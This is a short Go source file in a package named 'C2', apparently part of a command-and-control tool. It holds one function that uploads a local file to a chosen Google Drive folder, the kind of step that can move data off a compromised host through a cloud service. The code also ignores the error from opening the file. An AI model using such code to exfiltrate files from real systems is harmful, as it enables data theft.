package C2

import (
	"google.golang.org/api/drive/v3"
	"path/filepath"
	"os"
)

func uploadFile(clientDrive *drive.Service, localFilePath string, driveFolderId string) error {

	var parent []string
	parent = append(parent, driveFolderId)

	fileName := filepath.Base(localFilePath)

	f := &drive.File{
		Name:    fileName,
		DriveId: driveFolderId,
		Parents: parent,
	}

	file, _ := os.Open(localFilePath)

	_, err := clientDrive.Files.Create(f).Media(file).Do()

	return err

}